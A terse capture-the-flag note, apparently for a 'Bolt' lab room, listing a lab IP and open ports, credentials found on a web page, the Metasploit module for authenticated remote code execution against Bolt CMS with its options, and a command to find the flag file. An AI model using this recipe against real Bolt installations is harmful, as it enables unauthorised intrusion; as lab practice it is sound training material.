# Bolt
```

export_ip = 10.10.90.140
[Port]
22 ssh
80 http
8000 htto

[Credential]
: http://10.10.90.140:8000/entry/message-for-it-department
: ID -> bolt
: PASSWORD -> boltadmin123

[Metasploit Attack Vector]
: exploit/unix/webapp/bolt_authenticated_rce
: Settin up bellow
-> RHOST
-> USERNAME
-> PASSWORD
-> LHOST

[Find Flag]
sufo find / -name flag.txt 2>/dev/null


```